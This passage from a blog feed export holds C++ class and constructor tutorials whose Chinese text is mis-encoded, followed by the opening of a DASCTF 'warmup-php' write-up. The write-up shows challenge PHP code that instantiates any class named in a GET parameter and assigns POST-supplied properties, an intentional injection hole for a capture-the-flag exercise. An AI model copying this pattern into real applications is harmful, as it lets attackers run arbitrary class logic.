<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PI 3.14</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CircleController</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">/* data */</span></span><br><span class="line">    <span class="keyword">int</span> r;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">calculation</span><span class="params">(<span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> PI * r * r;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> r = <span class="number">10</span>;</span><br><span class="line">    CircleController c1;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;åœ†çš„é¢ç§¯ä¸ºï¼š&quot;</span> &lt;&lt; c1.<span class="built_in">calculation</span>(r) &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å®ä¾‹2ï¼šStudentç±»</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">/* data */</span></span><br><span class="line">    string name  = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> id = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// è·å–ä¿¡æ¯</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setInfot</span><span class="params">(string name,<span class="keyword">int</span> id)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">        <span class="keyword">this</span>-&gt;id = id;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">// è¾“å‡ºä¿¡æ¯</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">printInfor</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;your name:&quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;name &lt;&lt; <span class="string">&quot; and your id:&quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;id &lt;&lt; endl;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Student s1;</span><br><span class="line">    string name;</span><br><span class="line">    <span class="keyword">int</span> id = <span class="number">1</span>;</span><br><span class="line">    cin &gt;&gt; name;</span><br><span class="line">    cin &gt;&gt; id;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;your name:&quot;</span> &lt;&lt; name &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;your id:&quot;</span> &lt;&lt; id &lt;&lt; endl;</span><br><span class="line">    s1.<span class="built_in">setInfot</span>(name,id);</span><br><span class="line">    s1.<span class="built_in">printInfor</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è®¿é—®æƒé™æœ‰ï¼ŒClassçš„é»˜è®¤æƒé™æ˜¯<code>private</code>ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å…¬å…±æƒé™ public</span><br><span class="line">ä¿æŠ¤æƒé™ protected</span><br><span class="line">ç§æœ‰æƒé™ private</span><br></pre></td></tr></table></figure>

<p>æ¡ˆä¾‹3ï¼šè®¾è®¡ç«‹æ–¹ä½“ç±»ï¼ˆCubeï¼‰</p>
<p>æ±‚å‡ºç«‹æ–¹ä½“çš„é¢ç§¯å’Œä½“ç§¯ï¼Œåˆ†åˆ«ç”¨å…¨å±€å‡½æ•°å’Œæˆå‘˜å‡½æ•°åˆ¤æ–­ä¸¤ä¸ªç«‹æ–¹ä½“æ˜¯å¦ç›¸ç­‰</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cube</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">/* data */</span></span><br><span class="line">    <span class="keyword">double</span> m_L;</span><br><span class="line">    <span class="keyword">double</span> m_W;</span><br><span class="line">    <span class="keyword">double</span> m_H;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">getL</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> m_L;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">getW</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> m_W;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">getH</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> m_H;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">measure</span><span class="params">(Cube c)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(m_L == c.<span class="built_in">getL</span>() &amp;&amp; m_W == c.<span class="built_in">getW</span>() &amp;&amp; m_H == c.<span class="built_in">getH</span>())&#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;yes&quot;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;no&quot;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setData</span><span class="params">(<span class="keyword">double</span> L,<span class="keyword">double</span> W,<span class="keyword">double</span> H)</span></span>&#123;</span><br><span class="line">        m_L = L;</span><br><span class="line">        m_W = W;</span><br><span class="line">        m_H = H;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">getVolume</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> m_L * m_W * m_H;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">getArea</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span> * (m_L * m_W + m_W * m_H + m_L * m_H);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Measure</span><span class="params">(Cube c1,Cube c2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(c1.<span class="built_in">getL</span>() == c2.<span class="built_in">getL</span>() &amp;&amp; c1.<span class="built_in">getW</span>() == c2.<span class="built_in">getW</span>() &amp;&amp; c1.<span class="built_in">getH</span>() == c2.<span class="built_in">getH</span>())&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;yes&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;no&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Cube c1;</span><br><span class="line">    Cube c2;</span><br><span class="line">    c1.<span class="built_in">setData</span>(<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>);</span><br><span class="line">    c2.<span class="built_in">setData</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line">    c1.<span class="built_in">measure</span>(c2);</span><br><span class="line">    <span class="built_in">Measure</span>(c1,c2);</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;your volume:&quot;</span> &lt;&lt; c1.<span class="built_in">getVolume</span>() &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;your area:&quot;</span> &lt;&lt; c1.<span class="built_in">getArea</span>() &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ¡ˆä¾‹4ï¼šç‚¹å’Œåœ†ä¹‹é—´çš„å…³ç³»</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> x,y;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setPoint</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;x = x;</span><br><span class="line">        <span class="keyword">this</span>-&gt;y = y;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getX</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getY</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> y;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Circle</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">/* data */</span></span><br><span class="line">    <span class="keyword">int</span> r;</span><br><span class="line">    Point p;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setR</span><span class="params">(<span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;r = r;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setCenter</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">        p.<span class="built_in">setPoint</span>(x,y);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getR</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getCenterX</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> p.<span class="built_in">getX</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getCenterY</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> p.<span class="built_in">getY</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">measure</span><span class="params">(Circle c,Point p)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> res;</span><br><span class="line">    res = <span class="built_in">sqrt</span>((c.<span class="built_in">getCenterX</span>() - p.<span class="built_in">getX</span>()) * (c.<span class="built_in">getCenterX</span>() - p.<span class="built_in">getX</span>()) + (c.<span class="built_in">getCenterY</span>() - p.<span class="built_in">getY</span>()) * (c.<span class="built_in">getCenterY</span>() - p.<span class="built_in">getY</span>()));</span><br><span class="line">    <span class="keyword">if</span>(res == c.<span class="built_in">getR</span>())&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;the point on the circle&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(res &gt; c.<span class="built_in">getR</span>())&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;the point out the circle&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;the point in the circle&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Circle c;</span><br><span class="line">    c.<span class="built_in">setR</span>(<span class="number">10</span>);</span><br><span class="line">    c.<span class="built_in">setCenter</span>(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    Point p;</span><br><span class="line">    p.<span class="built_in">setPoint</span>(<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">measure</span>(c,p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-2-å¯¹è±¡çš„åˆå§‹åŒ–å’Œæ¸…ç†"><a href="#2-2-å¯¹è±¡çš„åˆå§‹åŒ–å’Œæ¸…ç†" class="headerlink" title="2.2 å¯¹è±¡çš„åˆå§‹åŒ–å’Œæ¸…ç†"></a>2.2 å¯¹è±¡çš„åˆå§‹åŒ–å’Œæ¸…ç†</h4><p>æ„é€ å‡½æ•°å’Œææ„å‡½æ•°</p>
<ul>
<li><p>æ„é€ å‡½æ•°ï¼šä¸»è¦ä½œç”¨åœ¨äºåˆ›å»ºå¯¹è±¡æ—¶ä¸ºå¯¹è±¡çš„æˆå‘˜å±æ€§èµ‹å€¼ï¼Œæ„é€ å‡½æ•°ç”±ç¼–è¯‘å™¨è‡ªåŠ¨è°ƒç”¨ï¼›</p>
</li>
<li><p>ææ„å‡½æ•°ï¼šä¸»è¦ä½œç”¨åœ¨äºå¯¹è±¡é”€æ¯å‰ç³»ç»Ÿè‡ªåŠ¨è°ƒç”¨ï¼Œæ‰§è¡Œä¸€äº›æ¸…ç†å·¥ä½œã€‚</p>
</li>
</ul>
<p>å®ä¾‹1ï¼š</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">/* data */</span></span><br><span class="line">    string name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Person</span>();</span><br><span class="line">    ~<span class="built_in">Person</span>();</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setName</span><span class="params">(string name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">string <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>-&gt;age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;your name:&quot;</span> &lt;&lt; name &lt;&lt; <span class="string">&quot; your age:&quot;</span> &lt;&lt; age &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Person::<span class="built_in">Person</span>()</span><br><span class="line">&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;contruct function&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Person::~<span class="built_in">Person</span>()</span><br><span class="line">&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;BYE!&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Person p1;</span><br><span class="line">    p1.<span class="built_in">setName</span>(<span class="string">&quot;Ameuu&quot;</span>);</span><br><span class="line">    p1.<span class="built_in">print</span>();</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>æ„é€ å‡½æ•°çš„åˆ†ç±»åŠè°ƒç”¨</strong></p>
<p>åˆ†ç±»ï¼š</p>
<p>â€‹    æŒ‰å‚æ•°åˆ†ç±»ï¼šæœ‰å‚ã€æ— å‚</p>
<p>â€‹    æŒ‰ç±»å‹åˆ†ç±»ï¼šæ™®é€šã€æ‹·è´</p>
<p>è°ƒç”¨ï¼š</p>
<p>â€‹    æ‹¬å·æ³•ã€æ˜¾ç¤ºæ³•ã€éšå¼è½¬æ¢æ³•</p>
<p>ç¤ºä¾‹ï¼š</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 1.æ„é€ å‡½æ•°çš„åˆ†ç±»åŠè°ƒç”¨</span></span><br><span class="line"><span class="comment"> * åˆ†ç±»ï¼šæœ‰å‚ æ— å‚/ æ™®é€š æ‹·è´</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/* data */</span></span><br><span class="line">    string name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Person</span>()&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;contruct funtion&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    ~<span class="built_in">Person</span>()&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;destruct function&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// æœ‰å‚æ„é€ å‡½æ•°</span></span><br><span class="line">    <span class="built_in">Person</span>(<span class="keyword">int</span> age)&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;the contrust funtion include args&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ‹·è´æ„é€ å‡½æ•°</span></span><br><span class="line">    <span class="built_in">Person</span>(<span class="keyword">const</span> Person &amp;p)&#123;</span><br><span class="line">        <span class="comment">//å°†ä¼ å…¥çš„ç±»çš„æ‰€æœ‰å±æ€§æ‹·è´åˆ°æœ¬ç±»èº«ä¸Š</span></span><br><span class="line">        age = p.age;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;copy contruct function&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// æ‹¬å·æ³•</span></span><br><span class="line">    <span class="comment">// Person p1; </span></span><br><span class="line">    <span class="comment">// Person p2(10);</span></span><br><span class="line">    <span class="comment">// Person p3(p2);</span></span><br><span class="line">    <span class="comment">// cout &lt;&lt; &quot;*****************************&quot; &lt;&lt; endl;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ˜¾ç¤º</span></span><br><span class="line">    <span class="comment">// Person p1;</span></span><br><span class="line">    <span class="comment">// Person p2 = Person(10);</span></span><br><span class="line">    <span class="comment">// Person p3 = Person(p2);</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Person(10); // åŒ¿åå¯¹è±¡ å½“å‰è¡Œæ‰§è¡Œç»“æŸä¹‹åï¼Œç³»ç»Ÿç«‹å³å›æ”¶</span></span><br><span class="line">    <span class="comment">// // æ³¨æ„ï¼šä¸èƒ½åˆ©ç”¨æ‹·è´æ„é€ å‡½æ•°åˆå§‹åŒ–åŒ¿åå¯¹è±¡</span></span><br><span class="line">    <span class="comment">// cout &lt;&lt; &quot;*****************************&quot; &lt;&lt; endl;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// éšå¼è½¬æ¢</span></span><br><span class="line">    Person p1 = <span class="number">10</span>;</span><br><span class="line">    Person p2 = p1;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>æ‹·è´æ„é€ å‡½æ•°çš„è°ƒç”¨</strong></p>
<p>â€‹    1.ä½¿ç”¨ä¸€ä¸ªåˆ›å»ºå®Œæ¯•çš„å¯¹è±¡æ¥åˆå§‹åŒ–ä¸€ä¸ªæ–°å¯¹è±¡</p>
<p>â€‹    2.å€¼ä¼ é€’çš„æ–¹å¼ç»™å‡½æ•°å‚æ•°ä¼ å€¼</p>
<p>â€‹    3.å€¼æ–¹å¼è¿”å›å±€éƒ¨å¯¹è±¡</p>
<p>ç¤ºä¾‹ï¼š</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Person</span>()&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;contruct funtion&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    ~<span class="built_in">Person</span>()&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;destruct function&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Person</span>(<span class="keyword">const</span> Person &amp;p)&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;copy contruct funtion&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(Person p)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Person <span class="title">test1</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Person p;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Person p = <span class="built_in">test1</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//    1.ä½¿ç”¨ä¸€ä¸ªåˆ›å»ºå®Œæ¯•çš„å¯¹è±¡æ¥åˆå§‹åŒ–ä¸€ä¸ªæ–°å¯¹è±¡</span></span><br><span class="line">    Person p1;</span><br><span class="line">    Person p2 = <span class="built_in">test1</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//    2.å€¼ä¼ é€’çš„æ–¹å¼ç»™å‡½æ•°å‚æ•°ä¼ å€¼</span></span><br><span class="line">    <span class="comment">// test(p1);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//    3.å€¼æ–¹å¼è¿”å›å±€éƒ¨å¯¹è±¡</span></span><br><span class="line">    <span class="comment">// Person p3 = test1();</span></span><br><span class="line">    <span class="comment">// test2();</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>æ²¡æœ‰äººæ¯”æˆ‘æ›´çˆ±å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>c++</tag>
        <tag>è¯­è¨€å­¦ä¹ </tag>
      </tags>
  </entry>
  <entry>
    <title>DASCTF Apr X FATE é˜²ç–«æŒ‘æˆ˜èµ› web</title>
    <url>/2022/04/27/DASCTF-Apr-X-FATE-%E9%98%B2%E7%96%AB%E6%8C%91%E6%88%98%E8%B5%9B-web/</url>
    <content><![CDATA[<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><blockquote>
<p>ä¸Šå‘¨æœ«å››åœºæ¯”èµ›ï¼Œç”±äºä¸€å¼€å§‹MRCTFå¤ªåç‰¢äº†ï¼Œä¸€ç›´åœ¨æ‰“DASï¼Œå‘¨æ—¥è°ƒä¼‘æ»¡è¯¾<del>ï¼ˆä¸»è¦æ˜¯åœ¨è¡¥ä½œä¸šï¼‰</del>èƒ–å“ˆå‹ƒå’Œç½‘åˆƒä¹Ÿéƒ½åªçœ‹äº†ä¸€ç‚¹ï¼Œå¿ƒç´¯ï¼Œå¿™é‡Œå·é—²èµ¶ç´§å¤ç°ä¸€ä¸‹ï¼ˆ</p>
</blockquote>
<span id="more"></span>

<h3 id="warmup-php"><a href="#warmup-php" class="headerlink" title="warmup-php"></a>warmup-php</h3><p>ä¸‹è½½é™„ä»¶ï¼Œæœ‰å››ä¸ªç±»</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">spl_autoload_register(<span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">require</span>(<span class="string">&quot;./class/&quot;</span>.<span class="variable">$class</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="variable">$properties</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;properties&#x27;</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Action</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$action</span>,<span class="variable">$properties</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$object</span>=<span class="keyword">new</span> <span class="variable">$action</span>();</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$properties</span> <span class="keyword">as</span> <span class="variable">$name</span>=&gt;<span class="variable">$value</span>)</span><br><span class="line">            <span class="variable">$object</span>-&gt;<span class="variable">$name</span>=<span class="variable">$value</span>;</span><br><span class="line">        <span class="variable">$object</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Action(<span class="variable">$action</span>,<span class="variable">$properties</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

